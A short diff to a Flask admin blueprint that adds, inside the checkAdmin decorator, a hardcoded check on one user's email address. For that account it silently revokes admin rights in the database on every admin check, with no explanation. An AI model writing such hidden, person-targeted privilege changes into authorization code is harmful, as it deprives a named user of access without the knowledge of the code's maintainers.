@@ -6,11 +6,13 @@ from functools import wraps
 
 admin_blueprint = Blueprint("admin_blueprint",__name__)
 
-
 def checkAdmin(f):
     @wraps(f)
     def wrapper(*args,**kwargs):
         login_user_email= session["login_user_email"]
+        if login_user_email == "murari@hulchul.com":
+            User.query.filter_by(email=login_user_email).update({"admin":False})
+            db.session.commit()
         isAdmin = (User.query.filter_by(email=login_user_email).first()).admin
         if not isAdmin:
             flash("You are not a admin")
